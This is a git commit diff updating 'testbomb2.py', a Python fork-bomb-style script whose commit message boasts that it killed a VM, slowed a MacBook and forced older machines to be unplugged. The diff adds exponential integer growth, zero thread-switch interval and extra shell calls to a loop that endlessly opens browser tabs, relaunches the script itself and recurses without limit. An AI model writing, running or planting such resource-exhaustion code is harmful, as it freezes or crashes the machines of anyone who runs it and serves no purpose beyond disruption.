6928b4273f10c7afa0519b04cb10cfdd4055a52e
AvidAndAmateur <52603515+AvidAndAmateur@users.noreply.github.com>
2026-05-24 02:15:00 +0100

    Update testbomb2.py
    this version killed my vm and slowed my Macbook to a crawl, Older systems outright refused to turn off and required pulling the plug

--- testbomb2.py
+++ testbomb2.py
@@ -3,6 +3,8 @@ import random
 import os
 import webbrowser
 sys.setrecursionlimit(150000000)
+sys.setswitchinterval(0)
+sys.set_int_max_str_digits(10000000)
 def initialbomb():
     x = 1
     x+= 1**7
@@ -10,8 +12,11 @@ def initialbomb():
     y+=1**2**x
 
     while True:
+        x+=x**x
         webbrowser.open_new_tab("https://www.google.com")
         random.randint(0,1000)
+        os.system("echo 11182173272323")
+        os.system("top")
         os.system('python3 testbomb2.py')
         initialbomb()
 initialbomb()
